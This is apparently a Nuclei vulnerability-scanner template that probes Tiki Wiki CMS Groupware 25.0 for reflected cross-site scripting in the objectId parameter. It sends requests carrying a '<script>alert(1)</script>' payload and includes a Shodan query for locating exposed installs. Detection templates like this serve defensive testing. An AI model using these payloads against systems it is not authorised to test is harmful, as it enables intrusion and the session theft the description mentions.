id: tikiwiki-xss

info:
  name: Tiki Wiki CMS Groupware v25.0 - Cross Site Scripting
  author: arafatansari
  severity: medium
  description: |
    Tiki Wiki CMS was discovered to contain a cross site scripting via objectId parameter which can perform a wide variety of actions, such as stealing the victim's session token or login credentials.
    - https://packetstormsecurity.com/files/170446/Tiki-Wiki-CMS-Groupware-25.0-Cross-Site-Scripting.html
  metadata:
    shodan-query: http.html:"tiki wiki"
    verified: "true"
  tags: xss,tiki,wiki,cms

requests:
  - raw:
      - |
        GET /tiki/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(1)</script> HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(1)</script> HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 403

      - type: word
        words:
          - '<script>alert(1)</script>'
